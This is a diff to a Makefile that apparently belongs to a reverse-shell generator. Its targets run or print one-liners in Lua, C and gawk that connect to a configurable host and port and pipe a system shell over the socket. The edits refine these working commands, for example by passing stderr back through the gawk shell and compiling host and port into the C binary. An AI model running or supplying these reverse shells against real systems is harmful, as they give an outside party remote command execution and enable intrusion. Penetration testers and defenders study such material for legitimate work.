@@ -259,10 +259,10 @@ php6-show:
 ############################ LUA ###########################
 
 lua:
-	lua -e 'socket = require("socket"); require("os"); socket.tcp():connect("$(HOST)",$(PORT)); os.execute("$(SHELL) <&3 >&3 2>&3");'
+	lua -e 'socket = require("socket"); socket.tcp():connect("$(HOST)",$(PORT)); os.execute("$(SHELL) <&3 >&3 2>&3");'
 
 lua-show:
-	@printf "lua -e 'socket = require(\"socket\"); require(\"os\"); socket.tcp():connect(\"$(HOST)\",$(PORT)); os.execute(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+	@printf "lua -e 'socket = require(\"socket\"); socket.tcp():connect(\"$(HOST)\",$(PORT)); os.execute(\"$(SHELL) <&3 >&3 2>&3\");'\n"
 
 ############################################################
 
@@ -343,10 +343,10 @@ julia-show:
 C_CODE := src/reverse_shell.c
 
 gcc:
-	gcc $(C_CODE) -o out; ./out $(HOST) $(PORT) $(SHELL); rm ./out
+	gcc $(C_CODE) -o out -DHOST="\"$(HOST)\"" -DPORT=$(PORT) -DSHELL="\"$(SHELL)\""; ./out; rm ./out
 
 gcc-show:
-	@printf "gcc $(C_CODE) -o out; ./out $(HOST) $(PORT) $(SHELL); rm ./out\n"
+	@printf "gcc $(C_CODE) -o out -DHOST=\"\\\\\"$(HOST)\\\\\"\" -DPORT=$(PORT) -DSHELL=\"\\\\\"$(SHELL)\\\\\"\"; ./out; rm ./out\n"
 
 ############################################################
 
@@ -363,13 +363,13 @@ javac-show:
 
 ############################################################
 
-########################### AWK ############################
+########################### GAWK ###########################
 
-awk:
-	awk 'BEGIN { sock = "/inet/tcp/0/$(HOST)/$(PORT)"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& sock; close(c)}}'
+gawk:
+	gawk 'BEGIN { sock = "/inet/tcp/0/$(HOST)/$(PORT)"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c " 2>&1" |& getline res) > 0) print res |& sock; close(c)}}'
 
-awk-show:
-	@printf "awk 'BEGIN { sock = \"/inet/tcp/0/$(HOST)/$(PORT)\"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c |& getline) > 0) print \$0 |& sock; close(c)}}'\n"
+gawk-show:
+	@printf "gawk 'BEGIN { sock = \"/inet/tcp/0/$(HOST)/$(PORT)\"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c \" 2>&1\" |& getline res) > 0) print res |& sock; close(c)}}'\n"
 
 ############################################################
 
